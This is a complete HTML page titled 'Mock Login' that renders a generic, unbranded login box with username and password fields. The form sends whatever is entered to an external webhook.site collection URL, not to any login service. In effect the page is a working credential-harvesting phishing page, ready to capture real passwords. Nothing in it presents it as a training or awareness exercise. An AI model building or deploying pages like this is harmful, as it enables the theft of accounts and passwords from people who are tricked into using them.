<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Mock Login</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f3f3f3;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .login-box {
      background: white;
      padding: 30px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      border-radius: 8px;
      max-width: 300px;
      width: 100%;
    }
    input {
      display: block;
      width: 100%;
      padding: 10px;
      margin: 15px 0;
      border-radius: 4px;
      border: 1px solid #ccc;
    }
    button {
      padding: 10px;
      background: #0066ff;
      color: white;
      border: none;
      border-radius: 4px;
      width: 100%;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <h2>Login</h2>
    <form action="https://webhook.site/603c4d20-de49-4763-a148-9f9508372528" method="POST">
      <input type="text" name="username" placeholder="Username" required />
      <input type="password" name="password" placeholder="Password" required />
      <button type="submit">Login</button>
    </form>
  </div>
</body>
</html>
